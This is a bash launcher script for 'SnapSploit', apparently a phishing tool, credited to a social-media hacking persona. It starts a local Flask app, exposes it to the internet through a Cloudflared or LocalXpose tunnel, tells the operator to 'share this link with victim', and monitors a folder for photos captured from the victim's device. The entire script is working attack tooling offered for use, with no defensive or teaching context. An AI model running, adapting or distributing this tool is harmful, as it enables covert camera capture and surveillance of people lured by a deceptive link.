#!/bin/bash
# SnapSploit - by Sharon Anil
# Instagram: @sharon_anil | YouTube: HackWSharon

# Colors
RED='\033[0;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Banner
clear
echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════╗"
echo "║              📸 SnapSploit v1.0              ║"
echo "║        Created by Sharon Anil                ║"
echo "║        YouTube: HackWSharon                  ║"
echo "║        Instagram: @sharon_anil               ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"

# Check inotify-tools
if ! command -v inotifywait &> /dev/null; then
    echo -e "${RED}[!] 'inotifywait' not found. Installing...${NC}"
    sudo apt install inotify-tools -y
fi

# Ensure captured folder exists
mkdir -p captured

# Start Flask server
echo -e "${YELLOW}⚡️ Starting Flask server...${NC}"
python3 app.py > /dev/null 2>&1 &
sleep 3

# Menu
echo -e "${GREEN}${BOLD}🚀 Choose Port Forwarding Method:${NC}"
echo -e "1) 🌩️  Cloudflared (Fast & Free)"
echo -e "2) 🌐 LocalXpose (Reliable, login required)"
echo -e "3) ❌ Exit"
read -p "> " choice

# Cloudflared
if [[ $choice == 1 ]]; then
    echo -e "${CYAN}[*] Launching Cloudflared Tunnel...${NC}"
    
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${RED}[-] Cloudflared not installed!${NC}"
        echo "Install with: sudo apt install cloudflared"
        pkill -f app.py
        exit 1
    fi

    rm -f cloudflared.log
    cloudflared tunnel --url http://localhost:5000 > cloudflared.log 2>&1 &
    sleep 6

    url=$(grep -oP 'https://[-0-9a-zA-Z]+\.trycloudflare\.com' cloudflared.log | head -n1)

    if [[ -n "$url" ]]; then
        echo -e "${GREEN}[✔] Share this link with victim: $url${NC}"
        #xdg-open "$url" 2>/dev/null
    else
        echo -e "${RED}[-] Failed to fetch Cloudflared public URL.${NC}"
        cat cloudflared.log
        pkill -f app.py
        exit 1
    fi

# LocalXpose
elif [[ $choice == 2 ]]; then
    echo -e "${CYAN}[*] Launching LocalXpose Tunnel...${NC}"

    if ! command -v loclx &> /dev/null; then
        echo -e "${RED}[-] LocalXpose not installed!${NC}"
        pkill -f app.py
        exit 1
    fi

    rm -f localxpose.log
    loclx tunnel http --to 127.0.0.1:5000 > localxpose.log 2>&1 &
    sleep 6

    url=$(grep -oP '[a-z0-9]+\.loclx\.io' localxpose.log | head -n1)
    url="https://$url"

    if [[ "$url" == "https://" ]]; then
        echo -e "${RED}[-] Failed to fetch LocalXpose public URL.${NC}"
        cat localxpose.log
        pkill -f app.py
        exit 1
    else
        echo -e "${GREEN}[✔] Share this link with victim: $url${NC}"
        #xdg-open "$url" 2>/dev/null
    fi

# Exit
elif [[ $choice == 3 ]]; then
    echo -e "${YELLOW}[*] Exiting SnapSploit...${NC}"
    pkill -f app.py
    echo -e "${CYAN}Goodbye from SnapSploit 🔚${NC}"
    exit 0

# Invalid
else
    echo -e "${RED}[!] Invalid Option. Exiting...${NC}"
    pkill -f app.py
    exit 1
fi

# Monitoring photo capture
echo -e "${CYAN}📸 SnapSploit is Live! Waiting for photos from victim...${NC}"
echo -e "${YELLOW}➡️  Press Ctrl + C to stop anytime.${NC}"
echo ""

# Monitor captured folder for new files
inotifywait -m captured -e create --format '%f' | while read FILENAME
do
    echo -e "${GREEN}[📸] New photo captured: captured/$FILENAME${NC}"
done
